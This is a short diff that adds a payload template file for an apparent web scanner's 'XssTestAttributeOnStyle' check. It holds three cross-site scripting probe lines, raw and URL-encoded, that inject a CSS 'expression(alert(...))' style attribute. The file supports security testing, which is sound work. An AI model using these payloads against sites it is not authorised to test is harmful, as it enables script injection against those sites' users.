@@ -1,0 +1,6 @@
+;template file for XssTestAttributeOnStyle payload
+;comments start with semicolon
+;payloads should be added line by line
+%3Ca%20style=%22xss:expression(alert(501337))%22%20/%3E
+%20style=%22xss:expression(alert(501337))%22%20/%3E
+<a style="xss:expression(alert(501337))" />%20style=%22xss:expression(alert(501337))%22%20/%3E
